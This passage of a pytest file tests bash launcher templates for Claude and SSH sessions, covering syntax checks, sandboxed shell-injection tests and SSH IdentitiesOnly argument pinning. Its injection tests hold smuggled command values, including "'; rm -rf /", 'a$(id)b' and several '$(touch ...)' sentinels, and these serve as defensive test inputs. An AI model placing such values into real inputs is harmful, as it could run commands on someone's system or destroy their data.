        "profile", ["claude-remote", "claude-local", "ssh-shell", "local-shell"]
    )
    def test_raw_builtin_templates(self, profile: str) -> None:
        """Load the raw (unrendered) template and verify bash -n passes."""
        # pylint: disable=protected-access
        svc = TemplateService()
        raw = svc._load_builtin_or_override(profile)  # type: ignore[attr-defined]
        _bash_syntax_check(raw, f"{profile}.sh (raw)")

    def test_rendered_claude_remote(self) -> None:
        svc = TemplateService()
        conn = _make_remote_conn()
        rendered = svc.render("claude-remote", conn, settings=_make_settings())
        _bash_syntax_check(rendered, "claude-remote (rendered)")

    def test_rendered_claude_local(self) -> None:
        svc = TemplateService()
        conn = _make_local_conn()
        _bash_syntax_check(svc.render("claude-local", conn), "claude-local (rendered)")

    def test_rendered_ssh_shell(self) -> None:
        svc = TemplateService()
        conn = _make_ssh_shell_conn()
        _bash_syntax_check(
            svc.render("ssh-shell", conn, settings=_make_settings()),
            "ssh-shell (rendered)",
        )

    def test_rendered_local_shell(self) -> None:
        svc = TemplateService()
        conn = _make_local_shell_conn()
        _bash_syntax_check(svc.render("local-shell", conn), "local-shell (rendered)")

    def test_rendered_with_malicious_project_folder(self) -> None:
        """Rendered output with injection attempts must still pass bash -n."""
        svc = TemplateService()
        conn = _make_local_shell_conn(project_folder="'; rm -rf /")
        rendered = svc.render("local-shell", conn)
        _bash_syntax_check(rendered, "local-shell (malicious project_folder)")

    def test_rendered_remote_with_malicious_host(self) -> None:
        svc = TemplateService()
        conn = _make_remote_conn(host="a$(id)b")
        rendered = svc.render("claude-remote", conn, settings=_make_settings())
        _bash_syntax_check(rendered, "claude-remote (malicious host)")


# ---------------------------------------------------------------------------
# 7. Executable injection tests — actually run rendered scripts in a sandbox
# ---------------------------------------------------------------------------


def _run_sandboxed(script: str, sentinel_paths: list[str]) -> subprocess.CompletedProcess[str]:
    """Write *script* to a temp file and execute it under bash with stub functions.

    A preamble is prepended that stubs out ``claude``, ``sudo``, ``ssh``, and
    ``scp`` so the script terminates quickly without requiring real binaries.

    stdin is fed ``q\\n`` so that the [r/s/q] reconnect loop receives ``q`` as
    the first ``read -n 1`` call and exits cleanly.  The script is run with a
    short timeout.
    """
    preamble = textwrap.dedent(
        """\
        # Sandbox stubs — replace real binaries so the script exits quickly.
        claude() { echo "stub-claude $*"; return 0; }
        sudo() {
            # Emulate: sudo -u <user> -i bash -ic '<body>' -- <args...>
            # Skip option flags; when we hit 'bash' execute the remaining argv.
            while [ $# -gt 0 ]; do
                case "$1" in
                    -u) shift 2 ;;
                    -i|-S) shift ;;
                    bash) shift; bash "$@"; return $?; ;;
                    *) shift ;;
                esac
            done
            return 0
        }
        ssh() {
            # Ignore all ssh calls — we only care about local-side execution.
            return 0
        }
        scp() { return 0; }
        export -f claude sudo ssh scp
        """
    )

    # Write rendered script to a NamedTemporaryFile so bash can execute it.
    with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False, encoding="utf-8") as fh:
        fh.write(preamble)
        fh.write("\n")
        fh.write(script)
        script_path = fh.name

    try:
        result = subprocess.run(
            ["bash", script_path],
            # Feed 'q\n' so the [r/s/q] loop's `read -n 1` gets 'q' and exits.
            input="q\n",
            capture_output=True,
            text=True,
            encoding="utf-8",
            timeout=5,
        )
    finally:
        os.unlink(script_path)

    return result


def _make_injection_conn_local(pid: int) -> types.SimpleNamespace:
    """Connection with malicious project_folder and claude_options."""
    return _make_local_conn(
        project_folder=f"/tmp/{pid}; touch /tmp/cpsm-pwn-{pid}",
        claude_options=f"$(touch /tmp/cpsm-pwn-claude-{pid})",
        sudo_user="",
    )


def _make_injection_conn_local_sudo(pid: int) -> types.SimpleNamespace:
    """Connection with malicious project_folder, claude_options AND sudo_user."""
    return _make_local_conn(
        project_folder=f"/tmp/{pid}; touch /tmp/cpsm-pwn-local-sudo-{pid}",
        claude_options=f"$(touch /tmp/cpsm-pwn-claude-sudo-{pid})",
        sudo_user=f"$(touch /tmp/cpsm-pwn-sudo-user-{pid})",
    )


def _sentinels_for_pid(pid: int) -> list[str]:
    return [
        f"/tmp/cpsm-pwn-{pid}",
        f"/tmp/cpsm-pwn-claude-{pid}",
        f"/tmp/cpsm-pwn-local-sudo-{pid}",
        f"/tmp/cpsm-pwn-claude-sudo-{pid}",
        f"/tmp/cpsm-pwn-sudo-user-{pid}",
        f"/tmp/cpsm-pwn-ssh-shell-{pid}",
    ]


def _cleanup_sentinels(sentinels: list[str]) -> None:
    for p in sentinels:
        try:
            os.unlink(p)
        except FileNotFoundError:
            pass


class TestActualInjection:
    """Execute rendered scripts in a sandbox and assert no sentinel files are created.

    This is the real security test.  TestRenderedQuoting only checks that
    shlex.quote(value) appears in the output — it gives false confidence because
    shlex.quote is only safe for one shell layer and the scripts have multiple.
    """

    def test_claude_local_no_injection(self) -> None:
        """claude-local: malicious project_folder and claude_options must not execute."""
        pid = os.getpid()
        sentinels = _sentinels_for_pid(pid)
        _cleanup_sentinels(sentinels)

        svc = TemplateService()
        conn = _make_injection_conn_local(pid)
        rendered = svc.render("claude-local", conn)

        try:
            _run_sandboxed(rendered, sentinels)
            for sentinel in sentinels:
                assert not Path(sentinel).exists(), (
                    f"Injection sentinel {sentinel!r} was created — "
                    "shell injection succeeded in claude-local rendered script!"
                )
        finally:
            _cleanup_sentinels(sentinels)

    def test_claude_local_sudo_no_injection(self) -> None:
        """claude-local with sudo_user: malicious values must not execute."""
        pid = os.getpid()
        sentinels = _sentinels_for_pid(pid)
        _cleanup_sentinels(sentinels)

        svc = TemplateService()
        conn = _make_injection_conn_local_sudo(pid)
        rendered = svc.render("claude-local", conn)

        try:
            _run_sandboxed(rendered, sentinels)
            for sentinel in sentinels:
                assert not Path(sentinel).exists(), (
                    f"Injection sentinel {sentinel!r} was created — "
                    "shell injection succeeded in claude-local (sudo) rendered script!"
                )
        finally:
            _cleanup_sentinels(sentinels)

    def test_ssh_shell_no_injection(self) -> None:
        """ssh-shell: malicious project_folder must not execute on the local side."""
        pid = os.getpid()
        sentinel = f"/tmp/cpsm-pwn-ssh-shell-{pid}"
        _cleanup_sentinels([sentinel])

        svc = TemplateService()
        conn = _make_ssh_shell_conn(
            project_folder=f"/tmp/safe; touch {sentinel}",
        )
        rendered = svc.render("ssh-shell", conn, settings=_make_settings())

        # ssh-shell uses `exec ssh ...` so the sandbox ssh stub terminates the
        # script before any injection could happen on the local side.
        try:
            _run_sandboxed(rendered, [sentinel])
            assert not Path(sentinel).exists(), (
                f"Injection sentinel {sentinel!r} was created — "
                "shell injection succeeded in ssh-shell rendered script!"
            )
        finally:
            _cleanup_sentinels([sentinel])

    def test_claude_remote_heredoc_no_injection(self) -> None:
        """claude-remote: the quoted heredoc must not expand injected values."""
        pid = os.getpid()
        sentinel = f"/tmp/cpsm-pwn-{pid}"
        _cleanup_sentinels([sentinel])

        svc = TemplateService()
        # Use a project_folder that would execute touch if the heredoc were unquoted
        conn = _make_remote_conn(
            project_folder=f"/tmp/safe; touch {sentinel}",
            claude_options=f"$(touch {sentinel})",
        )
        rendered = svc.render("claude-remote", conn, settings=_make_settings())

        # Confirm the quoted heredoc delimiter is present in the rendered script
        assert "<< 'REMOTE_SCRIPT_EOF'" in rendered, (
            "claude-remote: expected quoted heredoc delimiter << 'REMOTE_SCRIPT_EOF' "
            "but it was not found.  The heredoc is unquoted and vulnerable to injection."
        )

        try:
            _run_sandboxed(rendered, [sentinel])
            assert not Path(sentinel).exists(), (
                f"Injection sentinel {sentinel!r} was created — "
                "the claude-remote heredoc performed parameter expansion!"
            )
        finally:
            _cleanup_sentinels([sentinel])


# ---------------------------------------------------------------------------
# 7. IdentitiesOnly pinning — asserted against the argv ssh actually receives
# ---------------------------------------------------------------------------


def _capture_ssh_argv(script: str) -> list[list[str]]:
    """Run *script* and return the argv of every ssh/scp invocation it makes.

    Uses fake ssh/scp EXECUTABLES placed early on PATH, deliberately not the
    exported shell functions :func:`_run_sandboxed` uses.  ssh-shell.sh runs
    ``exec ssh ...``, and ``exec`` bypasses shell functions to execute a real
    binary — so a function stub is never called, the harness records nothing,
    and every assertion made against it is vacuously true.  Measured: with
    function stubs, ssh-shell recorded 0 invocations while claude-remote
    recorded 5.

    A fake binary is also the more faithful test: it observes exactly the argv
    a real ssh would have been handed.

    Returns one token list per invocation, in call order.
    """
    bindir = tempfile.mkdtemp(prefix="cpsm-fakebin-")
    log_path = os.path.join(bindir, "calls.log")
    for name in ("ssh", "scp"):
        stub = os.path.join(bindir, name)
        with open(stub, "w", encoding="utf-8") as fh:
            fh.write("#!/bin/bash\n")
            fh.write(f'printf "%s " "{name}" >> {shlex.quote(log_path)}\n')
            fh.write(f'printf "%s " "$@" >> {shlex.quote(log_path)}\n')
            fh.write(f'printf "\\n" >> {shlex.quote(log_path)}\n')
            fh.write("exit 0\n")
        os.chmod(stub, 0o755)

    with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False, encoding="utf-8") as fh:
        # claude/sudo stay function stubs: they are only ever called normally,
        # never via exec.
        fh.write("claude() { return 0; }\nsudo() { return 0; }\n")
        fh.write("export -f claude sudo\n\n")
        fh.write(script)
        script_path = fh.name

    env = dict(os.environ)
    env["PATH"] = bindir + os.pathsep + env.get("PATH", "")
    try:
        subprocess.run(
            ["bash", script_path],
            # The [r/s/q] reconnect loop's `read -n 1` needs a 'q' to exit.
            input="q\n",
            capture_output=True,
            text=True,
            encoding="utf-8",
            timeout=10,
            env=env,
        )
        if not os.path.exists(log_path):
            return []
        with open(log_path, encoding="utf-8") as fh:
            return [ln.split() for ln in fh.read().splitlines() if ln.strip()]
    finally:
        try:
            os.unlink(script_path)
        except OSError:
            pass
        shutil.rmtree(bindir, ignore_errors=True)


class TestIdentitiesOnlyPinning:
    """Every ssh/scp call a launcher builds must pin the identity.

    ``ssh -i <key>`` does not restrict ssh to that key: OpenSSH adds it to the
    keys ssh-agent holds plus the default ``~/.ssh/id_*`` files (``ssh -G``
    reports ``identitiesonly no`` by default).  So the key a connection is
    configured with need not be the key that authenticates, and an agent
    holding more keys than sshd's ``MaxAuthTries`` (default 6) can be
    disconnected before the right one is tried.

    These assert on the argv the rendered launcher actually hands to ssh.  The
    snapshot tests above pin the TEXT of the script, which would still pass if
    ``_ID_ARG`` were built correctly but never expanded onto the command line,
    or expanded after ``${_SSH_OPTIONS}`` where OpenSSH's first-value-wins rule
    would ignore it.
    """

    def test_ssh_shell_pins_every_invocation(self) -> None:
        svc = TemplateService()
        rendered = svc.render("ssh-shell", _make_ssh_shell_conn(), settings=_make_settings())
        calls = _capture_ssh_argv(rendered)
        # Exercise guard: an empty list makes every assertion below vacuous.
        assert calls, "no ssh invocation was recorded — the stub never fired"
        for argv in calls:
            assert "IdentitiesOnly=yes" in argv, argv
            assert "-i" in argv, argv
            # OpenSSH honours the FIRST value for a parameter, so the pin must
            # reach the command line ahead of the user's own options.
            assert argv.index("IdentitiesOnly=yes") < argv.index("-i"), argv

    def test_claude_remote_pins_every_invocation(self) -> None:
        svc = TemplateService()
        rendered = svc.render("claude-remote", _make_remote_conn(), settings=_make_settings())
        calls = _capture_ssh_argv(rendered)
        assert calls, "no ssh/scp invocation was recorded — the stub never fired"
        # This template has several ssh calls plus an scp. A fix applied to
        # only the first would pass a single-call assertion, so require more
        # than one and check them all.
        assert len(calls) > 1, f"expected multiple invocations, got {len(calls)}"
        for argv in calls:
            assert "IdentitiesOnly=yes" in argv, argv

    def test_no_identity_file_means_no_pin(self) -> None:
        """The regression that would break agent and default-key auth.

        ``IdentitiesOnly=yes`` with no ``-i`` restricts ssh to the default
        identity files and stops it using agent-held keys, so a connection
        with no key configured must not receive it.
        """
        conn = _make_ssh_shell_conn(identity_file="")
        svc = TemplateService()
        rendered = svc.render("ssh-shell", conn, settings=_make_settings())
        calls = _capture_ssh_argv(rendered)
        assert calls, "no ssh invocation was recorded — the stub never fired"
        for argv in calls:
            assert "-i" not in argv, argv
            assert not any("IdentitiesOnly" in tok for tok in argv), argv

    def test_explicit_user_setting_is_not_overridden(self) -> None:
        """A deliberate IdentitiesOnly=no in default_ssh_options must win.

        ``${_ID_ARG}`` is expanded before ``${_SSH_OPTIONS}`` on every command
        line, and OpenSSH takes the first value, so injecting unconditionally
        would silently defeat the user's setting rather than defer to it.
        """
        settings = _make_settings("-o IdentitiesOnly=no -o ConnectTimeout=10")
        svc = TemplateService()
        rendered = svc.render("ssh-shell", _make_ssh_shell_conn(), settings=settings)
        calls = _capture_ssh_argv(rendered)
        assert calls, "no ssh invocation was recorded — the stub never fired"
        for argv in calls:
            assert "IdentitiesOnly=no" in argv, argv
            assert "IdentitiesOnly=yes" not in argv, argv

    @pytest.mark.parametrize(
        "raw_options",
        [
            "-o identitiesonly=no",
            "-o IDENTITIESONLY=no",
            "-o IdentitiesOnly=no",
            "-o  IdentitiesOnly=no",  # multiple spaces
            "-o\tIdentitiesOnly=no",  # tab
            "-o IdentitiesOnly no",  # space-separated key and value
            "-oIdentitiesOnly=no",  # CONCATENATED -- ssh accepts this
            "-oidentitiesonly=no",  # concatenated + lowercase
            "-o ConnectTimeout=10 -oIdentitiesOnly=no",  # concatenated, not first
        ],
    )
    def test_user_setting_detected_in_every_form_ssh_accepts(self, raw_options: str) -> None:
        """Detection must cover every spelling ssh itself accepts.

        default_ssh_options is free text from a QLineEdit, so it is not
        constrained to `-o Key=Value`. The concatenated `-oKey=Value` form is
        the one that matters most here: a shell regex anchored on whitespace
        missed it, which would have silently overridden a deliberate user
        setting — the exact harm this conditional exists to prevent. Verified
        against the real binary that ssh accepts it.
        """
        settings = _make_settings(raw_options)
        svc = TemplateService()
        rendered = svc.render("ssh-shell", _make_ssh_shell_conn(), settings=settings)
        calls = _capture_ssh_argv(rendered)
        assert calls, "no ssh invocation was recorded — the stub never fired"
        for argv in calls:
            assert "IdentitiesOnly=yes" not in argv, argv

    @pytest.mark.parametrize(
        "raw_options",
        [
            "-o ProxyCommand=/usr/bin/identitiesonlyproxy.sh %h %p",
            "-o IdentitiesOnlyExtra=yes",
            "-o ConnectTimeout=10",
        ],
    )
    def test_lookalike_options_do_not_suppress_the_pin(self, raw_options: str) -> None:
        """Only a real IdentitiesOnly keyword counts as the user's preference.

        A bare substring search suppressed the pin for the ProxyCommand case,
        leaving the connection unpinned while nothing said so. An option that
        merely CONTAINS the text, or a different keyword that starts with it,
        must not be mistaken for the user having set it.
        """
        settings = _make_settings(raw_options)
        svc = TemplateService()
        rendered = svc.render("ssh-shell", _make_ssh_shell_conn(), settings=settings)
        calls = _capture_ssh_argv(rendered)
        assert calls, "no ssh invocation was recorded — the stub never fired"
        for argv in calls:
            assert "IdentitiesOnly=yes" in argv, argv


class TestSshOptionValues:
    """Unit tests for _ssh_option_values, which replaced shell parsing.

    Deciding whether the user already set IdentitiesOnly was attempted twice
    in the shell template and got it wrong both times — once suppressing the
    pin for an unrelated option containing the text, once missing the
    concatenated `-oKey=Value` form ssh accepts. The logic now lives here,
    where it can be tested directly rather than only through a rendered
    launcher.
    """

    @pytest.mark.parametrize(
        ("raw", "expected"),
        [
            ("", []),
            ("-o ConnectTimeout=10", ["ConnectTimeout=10"]),
            ("-oConnectTimeout=10", ["ConnectTimeout=10"]),
            (
                "-o ConnectTimeout=10 -o ServerAliveInterval=30",
                ["ConnectTimeout=10", "ServerAliveInterval=30"],
            ),
            ("-o IdentitiesOnly no", ["IdentitiesOnly"]),
            # A newline between the flag and its value. shlex treats it as
            # whitespace, so this works -- but it was only ever verified by a
            # reviewer probing by hand, never pinned by a test until now.
            ("-o\nIdentitiesOnly=no", ["IdentitiesOnly=no"]),
            ('-o "IdentitiesOnly no"', ["IdentitiesOnly no"]),
            ("-p 2222 -o BatchMode=yes", ["BatchMode=yes"]),
            # A trailing bare -o has no value and must not crash or invent one.
            ("-o", []),
        ],
    )
    def test_extracts_option_values(self, raw: str, expected: list[str]) -> None:
        assert _ssh_option_values(raw) == expected

    def test_unbalanced_quotes_do_not_raise(self) -> None:
        """User input is free text and may be malformed.

        A ValueError escaping shlex.split here would abort rendering a
        launcher, i.e. the user could not open a session at all. Falling back
        to whitespace splitting keeps the connection working.
        """
        assert _ssh_option_values('-o Foo="unbalanced') == ['Foo="unbalanced']

    @pytest.mark.parametrize(
        ("raw", "expected"),
        [
            ("-o IdentitiesOnly=no", True),
            ("-oIdentitiesOnly=no", True),
            ("-oidentitiesonly=no", True),
            ("-o IdentitiesOnly no", True),
            ("-o\nIdentitiesOnly=no", True),
            ("-o ConnectTimeout=10", False),
            ("-o IdentitiesOnlyExtra=yes", False),
            ("-o ProxyCommand=/usr/bin/identitiesonlyproxy.sh %h %p", False),
            ("", False),
        ],
    )
    def test_detects_the_keyword_via_shared_rule(self, raw: str, expected: bool) -> None:
        """Composed with SshBinary's has_ssh_option — one keyword rule, not two."""
        from cpsm.platform.ssh_binary import has_ssh_option

        assert has_ssh_option(_ssh_option_values(raw), "IdentitiesOnly") is expected
